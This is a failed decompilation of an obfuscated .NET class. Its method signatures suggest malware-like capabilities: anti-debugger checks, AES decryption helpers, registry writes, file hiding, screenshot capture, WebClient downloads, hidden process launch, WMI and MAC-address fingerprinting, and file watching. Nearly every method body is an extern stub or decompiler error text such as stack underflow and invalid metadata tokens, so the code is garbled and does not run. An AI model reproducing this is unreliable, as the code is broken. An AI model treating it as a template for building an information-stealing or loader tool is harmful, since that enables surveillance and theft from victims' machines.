using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	public static extern string smethod_0(string string_4);

	private static extern void Main();

	private static extern void smethod_1();

	private static bool smethod_2()
	{
		//Discarded unreachable code: IL_0007, IL_000c, IL_000d, IL_0013, IL_0019
		//IL_0003: Expected O, but got Unknown
		//IL_0014: Invalid comparison between Unknown and I4
		/*Error near IL_0001: ldarg 3 (out-of-bounds)*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	private static extern bool smethod_3();

	private static extern bool smethod_4();

	private unsafe static string smethod_5()
	{
		//Discarded unreachable code: IL_0008, IL_000d, IL_0012, IL_001d
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected I4, but got Unknown
		checked
		{
			_ = (sbyte)(*unchecked((nuint*)(nint)/*Error near IL_0001: Stack underflow*/));
			/*Error near IL_0003: Invalid metadata token*/;
		}
	}

	private static extern void smethod_6();

	private static extern void smethod_7(object sender, FileSystemEventArgs e);

	private static extern void smethod_8();

	private static extern void smethod_9();

	public static bool smethod_10(string string_4)
	{
		//Discarded unreachable code: IL_0004, IL_0013
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected native int or pointer, but got O
		//IL_000e: Incompatible stack heights: 0 vs 1
		//IL_001c: Expected I4, but got Unknown
		_003F val = checked(/*Error near IL_0001: Stack underflow*/ - /*Error near IL_0001: Stack underflow*/);
		_ = /*Error near IL_0003: Stack underflow*/% val;
		/*Error near IL_0003: Unknown opcode: 0xFA*/;
	}

	public Class5()
	{
		_ = (int)(byte)"";
		/*Error: Unexpected end of block*/;
	}

	unsafe static byte[] smethod_11(string string_4)
	{
		//IL_0005: Expected O, but got I
		long num = checked((long)/*Error near IL_0001: Stack underflow*/);
		/*OpCode not supported: Ckfinite*/;
		return (byte[])(*(nint*)num);
	}

	static extern RijndaelManaged smethod_12();

	static extern void smethod_13(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern void smethod_14(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern Encoding smethod_15();

	static extern byte[] smethod_16(Encoding encoding_0, string string_4);

	static extern void smethod_17(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static void smethod_18(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
	}

	static void smethod_19(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0)
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0018
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected I, but got O
		//IL_0013: Invalid comparison between Unknown and I8
		//IL_001d: Expected I8, but got I
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_20(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static extern byte[] smethod_21(SymmetricAlgorithm symmetricAlgorithm_0);

	unsafe static byte[] smethod_22(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		//Discarded unreachable code: IL_0009
		_ = *(double*)(nint)/*Error near IL_0001: Stack underflow*/;
		checked
		{
			_ = (int)unchecked((uint)checked((short)/*Error near IL_0001: ldloc 0 (out-of-bounds)*/));
			/*Error near IL_0004: Invalid metadata token*/;
		}
	}

	static extern ICryptoTransform smethod_23(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_24(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static Encoding smethod_25()
	{
		//Discarded unreachable code: IL_0001
		/*Error: Unknown opcode: 0xFD*/;
	}

	unsafe static string smethod_26(Encoding encoding_0, byte[] byte_0)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		*(_003F*)(nint)/*Error near IL_0002: Stack underflow*/ = /*Error near IL_0002: Stack underflow*/;
		checked
		{
			_ = /*Error near IL_0004: Stack underflow*/* 5;
			/*Error near IL_0004: Invalid metadata token*/;
		}
	}

	static extern void smethod_27(IDisposable idisposable_0);

	static extern string smethod_28(string string_4);

	static Assembly smethod_29()
	{
		//Discarded unreachable code: IL_0001, IL_000e, IL_0013, IL_0015, IL_001b, IL_0022, IL_002a, IL_0031
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Unknown opcode: 0xFD*/;
	}

	static extern string smethod_30(Assembly assembly_0);

	static extern string smethod_31(string string_4, string string_5);

	unsafe static void smethod_32(string string_4, string string_5, bool bool_5)
	{
		//Discarded unreachable code: IL_000e, IL_0013, IL_0018
		while (7u != 0)
		{
		}
		_ = *(IntPtr*)(int)checked((uint)/*Error near IL_0008: Stack underflow*/);
		/*Error near IL_0009: Invalid metadata token*/;
	}

	static extern RegistryKey smethod_33(RegistryKey registryKey_0, string string_4, bool bool_5);

	static extern void smethod_34(RegistryKey registryKey_0, string string_4, object object_0);

	static void smethod_35(string string_4, FileAttributes fileAttributes_0)
	{
		switch (/*Error near IL_0005: Stack underflow*/)
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern Rectangle smethod_36(Point point_0);

	static extern Bitmap smethod_37(int int_0, int int_1);

	static extern Graphics smethod_38(Image image_0);

	static extern void smethod_39(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	static extern ImageFormat smethod_40();

	static void smethod_41(Image image_0, string string_4, ImageFormat imageFormat_0)
	{
		_ = (short)(double)/*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	static WebClient smethod_42()
	{
		//Discarded unreachable code: IL_0007
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
		}
	}

	static extern bool smethod_43(string string_4);

	static extern void smethod_44(string string_4);

	static extern void smethod_45(WebClient webClient_0, string string_4, string string_5);

	static Process smethod_46()
	{
		//Discarded unreachable code: IL_0005
		/*Error: Invalid metadata token*/;
	}

	static extern ProcessStartInfo smethod_47();

	static void smethod_48(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0)
	{
		//Discarded unreachable code: IL_0014, IL_0017, IL_001c, IL_0021
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		do
		{
			((object[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/] = (object)/*Error near IL_0003: Stack underflow*/;
		}
		while (/*Error near IL_0008: Stack underflow*/ > /*Error near IL_0008: Stack underflow*/);
		checked
		{
			_ = (uint)unchecked(/*Error near IL_0009: Stack underflow*/ % /*Error near IL_0009: Stack underflow*/);
			/*Error near IL_000f: Invalid metadata token*/;
		}
	}

	static extern void smethod_49(ProcessStartInfo processStartInfo_0, string string_4);

	static extern void smethod_50(Process process_0, ProcessStartInfo processStartInfo_0);

	unsafe static bool smethod_51(Process process_0)
	{
		//IL_0008: Expected F8, but got I
		//IL_000d: Invalid comparison between Unknown and I
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		do
		{
			*(_003F*)(nint)/*Error near IL_0001: Stack underflow*/ = /*Error near IL_0001: Stack underflow*/;
			*(double*)(int)((byte[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/] = (nint)(nuint)process_0;
		}
		while ((nint)/*Error near IL_0012: Stack underflow*/ >= (nint)(nuint)process_0);
		*(_003F*)(nint)/*Error near IL_0014: Stack underflow*/ = /*Error near IL_0014: Stack underflow*/;
		_003F val = /*Error near IL_0014: ldarg 2 (out-of-bounds)*/;
		_ = /*Error near IL_0018: Stack underflow*/- val;
		/*Error near IL_0018: Invalid metadata token*/;
	}

	static extern void smethod_52(Process process_0);

	static extern string smethod_53(string string_4);

	static extern string[] smethod_54(string string_4, char[] char_0);

	static extern string smethod_55(WebClient webClient_0, string string_4);

	static string smethod_56()
	{
		ulong num = ((ushort[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		_ = ((float[])/*Error near IL_0004: Stack underflow*/)[num];
		/*Error: Unexpected end of block*/;
	}

	static extern string smethod_57();

	static extern string smethod_58(string[] string_4);

	static extern void smethod_59(int int_0);

	static extern Process[] smethod_60();

	unsafe static string smethod_61(Process process_0)
	{
		int num = *(int*)(nint)/*Error near IL_0001: Stack underflow*/;
		checked
		{
			_ = (nuint)unchecked((ulong)((double[])/*Error near IL_0002: Stack underflow*/)[num]);
			/*Error: Unexpected end of block*/;
		}
	}

	static extern void smethod_62(Process process_0);

	static extern Process smethod_63();

	static IntPtr smethod_64(Process process_0)
	{
		//Discarded unreachable code: IL_0001, IL_0008, IL_001b, IL_0023, IL_002d
		//IL_0003: Expected I4, but got I8
		//IL_000d: Expected I8, but got I4
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got F4
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Incompatible stack heights: 0 vs 2
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Unknown opcode: 0xF9*/;
	}

	static extern ManagementObjectSearcher smethod_65(string string_4);

	static extern ManagementObjectCollection smethod_66(ManagementObjectSearcher managementObjectSearcher_0);

	static extern ManagementObjectEnumerator smethod_67(ManagementObjectCollection managementObjectCollection_0);

	static extern ManagementBaseObject smethod_68(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern object smethod_69(ManagementBaseObject managementBaseObject_0, string string_4);

	static extern string smethod_70(object object_0);

	static extern string smethod_71(string string_4);

	static extern bool smethod_72(string string_4, string string_5);

	static extern string smethod_73(string string_4);

	static bool smethod_74(string string_4, string string_5)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Expected I4, but got Unknown
		sbyte num = checked((sbyte)/*Error near IL_0001: Stack underflow*/);
		_003F val = /*Error near IL_0003: Stack underflow*// num;
		((short[])/*Error near IL_0004: Stack underflow*/)[/*Error near IL_0004: Stack underflow*/] = (short)(int)val;
		/*Error: Unexpected end of block*/;
	}

	static extern bool smethod_75(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern NetworkInterface[] smethod_76();

	static extern OperationalStatus smethod_77(NetworkInterface networkInterface_0);

	unsafe static PhysicalAddress smethod_78(NetworkInterface networkInterface_0)
	{
		//Discarded unreachable code: IL_001b
		//IL_000a: Expected F8, but got I4
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if (3u != 0)
			{
				short num = (short)/*Error near IL_0009: Stack underflow*/;
				*(double*)(nint)/*Error near IL_000a: Stack underflow*/ = num;
				if (/*Error near IL_000f: Stack underflow*/ > /*Error near IL_000f: Stack underflow*/&& /*Error near IL_0014: Stack underflow*/== /*Error near IL_0014: Stack underflow*/&& /*Error near IL_0019: Stack underflow*/<= /*Error near IL_0019: Stack underflow*/)
				{
					break;
				}
			}
		}
		_ = *(double*)(nint)/*Error near IL_001a: Stack underflow*/;
		/*Error near IL_001a: Unknown opcode: 0xF8*/;
	}

	static string smethod_79(string string_4, string string_5, string string_6)
	{
		//Discarded unreachable code: IL_000b
		//IL_0010: Expected O, but got I4
		//IL_001e: Expected I4, but got I8
		while (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
		{
		}
		checked
		{
			_ = (sbyte)/*Error near IL_0006: Stack underflow*/;
			/*Error near IL_0006: Invalid metadata token*/;
		}
	}

	static extern string smethod_80(string string_4, char[] char_0);

	static extern FileSystemWatcher smethod_81();

	static extern string smethod_82(Environment.SpecialFolder specialFolder_0);

	static void smethod_83(FileSystemWatcher fileSystemWatcher_1, string string_4)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected F4, but got Unknown
		checked
		{
			while (true)
			{
				ushort num = (ushort)/*Error near IL_0001: Stack underflow*/;
				if (/*Error near IL_0002: Stack underflow*/ + num == 0)
				{
					_003F val = /*Error near IL_000a: Stack underflow*/- /*Error near IL_000a: Stack underflow*/;
					((float[])/*Error near IL_000b: Stack underflow*/)[/*Error near IL_000b: Stack underflow*/] = (float)val;
					if (/*Error near IL_0010: Stack underflow*/ >= /*Error near IL_0010: Stack underflow*/)
					{
						break;
					}
				}
			}
			_ = (sbyte)/*Error near IL_0011: Stack underflow*/;
			/*Error near IL_0012: Invalid metadata token*/;
		}
	}

	static void smethod_84(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0)
	{
		_ = ((Array)/*Error near IL_0001: Stack underflow*/).LongLength;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern void smethod_85(FileSystemWatcher fileSystemWatcher_1, string string_4);

	unsafe static void smethod_86(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0)
	{
		//Discarded unreachable code: IL_0008, IL_000a
		*(_003F*)(nint)/*Error near IL_0003: Stack underflow*/ = /*Error near IL_0003: Stack underflow*/;
		*(_003F*)(nint)/*Error near IL_0004: Stack underflow*/ = /*Error near IL_0004: Stack underflow*/;
		checked
		{
			_ = (short)unchecked((int)((byte[])/*Error near IL_0006: Stack underflow*/)[/*Error near IL_0006: Stack underflow*/]);
			/*Error near IL_0007: Unknown opcode: 0xFA*/;
		}
	}

	static extern void smethod_87(FileSystemWatcher fileSystemWatcher_1, bool bool_5);

	static extern bool smethod_88(string string_4, string string_5);

	static extern bool smethod_89(string string_4);

	static extern string[] smethod_90(string string_4, string string_5);

	static extern Match smethod_91(string string_4, string string_5);

	static extern WebHeaderCollection smethod_92(WebClient webClient_0);

	unsafe static void smethod_93(WebHeaderCollection webHeaderCollection_0, HttpRequestHeader httpRequestHeader_0, string string_4)
	{
		//Discarded unreachable code: IL_000c
		//IL_0006: Expected native int or pointer, but got O
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		_ = *(int*)unchecked((nint)"");
		/*Error near IL_0007: Invalid metadata token*/;
	}
}
